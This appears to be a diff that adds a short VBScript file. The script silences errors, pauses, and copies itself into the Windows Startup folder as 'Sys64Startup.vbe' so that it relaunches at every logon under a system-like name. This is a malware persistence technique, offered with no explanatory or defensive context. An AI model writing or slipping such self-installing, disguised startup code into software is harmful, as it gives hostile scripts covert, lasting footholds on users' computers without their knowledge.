@@ -1,0 +1,9 @@
+
+
+on error resume next
+WScript.Sleep 6000
+set startshe = wscript.createobject("wscript.shell")
+set sysOb = createobject("scripting.filesystemobject")
+startup = startshe.specialfolders ("startup") & "\Sys64Startup.vbe"
+sysOb.copyfile wscript.scriptfullname,startup ,true
+WScript.Sleep 6000
